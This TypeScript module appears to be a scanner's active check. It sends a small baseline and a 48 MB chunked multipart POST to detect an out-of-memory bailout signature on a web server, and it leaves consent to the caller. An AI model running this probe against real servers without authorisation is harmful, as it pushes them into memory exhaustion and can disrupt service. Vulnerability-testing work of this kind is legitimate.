// The active half: one baseline request and one large chunked request, compared for the
// out-of-memory bailout signature. The method is what was measured live on rest.vulnweb.com
// (2026-10-23): bodies up to 40 MB reach the application; at 48 MB and above the request dies
// during request startup and the server answers with an empty 200 the application never wrote.
// We send 48 MB and judge the SIGNATURE, never the size alone. No exploit code is sent and
// nothing is executed on the target.

import * as net from 'node:net';
import * as tls from 'node:tls';

export type ValidateOptions = {
  /** Body size of the control request (default 1 MB). */
  baselineBytes?: number;
  /** Body size of the large request (default 48 MB, the measured threshold). */
  payloadBytes?: number;
  timeoutMs?: number;
  path?: string;
  /** Connect to this resolved address; the Host header still carries the name. */
  address?: string;
};

export type Validation = {
  ok: true;
  verdict: 'triggered' | 'not-triggered';
  baseline: { status: number; bodyBytes: number };
  payload: { status: number; bodyBytes: number; sentBytes: number; ms: number };
  /** The observed difference, in one sentence, for the report. */
  signature: string;
} | { ok: false; error: 'unreachable' | 'timeout' };

const BOUNDARY = 'P2SLABS';

type RawResponse = { status: number; bodyBytes: number; sentBytes: number; ms: number };

function chunk(s: net.Socket, data: Buffer): void {
  s.write(`${data.length.toString(16)}\r\n`);
  s.write(data);
  s.write('\r\n');
}

/** One chunked multipart POST with a generated body of `bytes` filler. Raw socket: the
 *  Transfer-Encoding framing is ours, exactly as in the live measurement. */
function chunkedPost(
  host: string,
  port: number,
  tlsConn: boolean,
  path: string,
  bytes: number,
  timeoutMs: number,
  address?: string,
): Promise<RawResponse> {
  return new Promise((resolve, reject) => {
    const started = Date.now();
    let socket: net.Socket = net.connect({ host: address ?? host, port });
    if (tlsConn) {
      socket = tls.connect({ socket, servername: host });
    }

    let settled = false;
    const finish = (err: Error | null, result?: RawResponse) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      socket.destroy();
      if (err) reject(err);
      else resolve(result!);
    };

    const timer = setTimeout(() => finish(new Error('timeout')), timeoutMs);

    socket.on('error', (err) => finish(err));

    let header = '';
    let headerDone = false;
    let bodyBytes = 0;
    let sentBytes = 0;

    socket.on('data', (data: Buffer) => {
      if (!headerDone) {
        header += data.toString('latin1');
        const split = header.indexOf('\r\n\r\n');
        if (split === -1) return;
        headerDone = true;
        const statusLine = header.slice(0, header.indexOf('\r\n'));
        const status = Number(statusLine.split(' ')[1]) || 0;
        // Count whatever body arrived (possibly chunked-encoded; sizes are what matter).
        const rest = header.slice(split + 4);
        bodyBytes += rest.length;
        if (rest.length === 0) {
          // Connection closed with no body: the signature we look for.
          finish(null, { status, bodyBytes, sentBytes, ms: Date.now() - started });
        } else {
          finish(null, { status, bodyBytes, sentBytes, ms: Date.now() - started });
        }
        return;
      }
      bodyBytes += data.length;
    });

    socket.on('close', () => {
      if (!settled) {
        const statusLine = header.split('\r\n')[0] ?? '';
        const status = Number(statusLine.split(' ')[1]) || 0;
        finish(null, { status, bodyBytes, sentBytes, ms: Date.now() - started });
      }
    });

    socket.on('connect', () => {
      socket.write(
        `POST ${path} HTTP/1.1\r\n` +
          `Host: ${host}\r\n` +
          `Content-Type: multipart/form-data; boundary=${BOUNDARY}\r\n` +
          `Transfer-Encoding: chunked\r\n` +
          `Connection: close\r\n\r\n`,
      );
      const first = Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="d"\r\n\r\n`);
      chunk(socket, first);
      const block = Buffer.alloc(16 * 1024, 0x41);
      let remaining = bytes;
      const pump = () => {
        while (remaining > 0 && socket.writable) {
          const take = Math.min(block.length, remaining);
          remaining -= take;
          sentBytes += take;
          if (take === block.length) {
            chunk(socket, block);
          } else {
            chunk(socket, block.subarray(0, take));
          }
          // Let the socket drain; keep the promise alive.
          if (socket.bufferSize > 1024 * 1024) {
            socket.once('drain', pump);
            return;
          }
        }
        socket.write('0\r\n\r\n'); // terminating chunk
      };
      pump();
    });
  });
}

function describeSignature(baseline: RawResponse, payload: RawResponse): string | null {
  const payloadEmpty = payload.bodyBytes === 0;
  const statusChanged = payload.status !== baseline.status;
  const bodyVanished = baseline.bodyBytes > 0 && payloadEmpty;
  if (payload.status === 200 && payloadEmpty && (statusChanged || bodyVanished)) {
    return `an empty 200 where the application answered ${baseline.status}` +
      (bodyVanished ? ' with a page' : '');
  }
  return null;
}

/** The exploit validation. Consent is the caller's business; this runs when asked. */
export async function validate(
  host: string,
  port: number,
  tlsConn: boolean,
  opts: ValidateOptions = {},
): Promise<Validation> {
  const baselineBytes = opts.baselineBytes ?? 1024 * 1024;
  const payloadBytes = opts.payloadBytes ?? 48 * 1024 * 1024;
  const timeoutMs = opts.timeoutMs ?? 90_000;
  const path = opts.path ?? '/';

  let baseline: RawResponse;
  try {
    baseline = await chunkedPost(host, port, tlsConn, path, baselineBytes, timeoutMs, opts.address);
  } catch (err) {
    const message = (err as Error).message;
    if (message === 'timeout') return { ok: false, error: 'timeout' };
    return { ok: false, error: 'unreachable' };
  }

  let payload: RawResponse;
  try {
    payload = await chunkedPost(host, port, tlsConn, path, payloadBytes, timeoutMs, opts.address);
  } catch (err) {
    const message = (err as Error).message;
    if (message === 'timeout') return { ok: false, error: 'timeout' };
    // A connection torn down mid-upload under memory pressure is part of the signature,
    // but on its own it proves only that the server dropped us: report it as triggered
    // only when the baseline reached the application.
    if (baseline.status > 0) {
      return {
        ok: true,
        verdict: 'triggered',
        baseline: { status: baseline.status, bodyBytes: baseline.bodyBytes },
        payload: { status: 0, bodyBytes: 0, sentBytes: 0, ms: 0 },
        signature: `the connection was torn down during the large request while the small one reached the application (${baseline.status})`,
      };
    }
    return { ok: false, error: 'unreachable' };
  }

  const signature = describeSignature(baseline, payload);
  return {
    ok: true,
    verdict: signature ? 'triggered' : 'not-triggered',
    baseline: { status: baseline.status, bodyBytes: baseline.bodyBytes },
    payload: { status: payload.status, bodyBytes: payload.bodyBytes, sentBytes: payload.sentBytes, ms: payload.ms },
    signature: signature ?? 'the large request was answered like the small one; no bailout signature',
  };
}
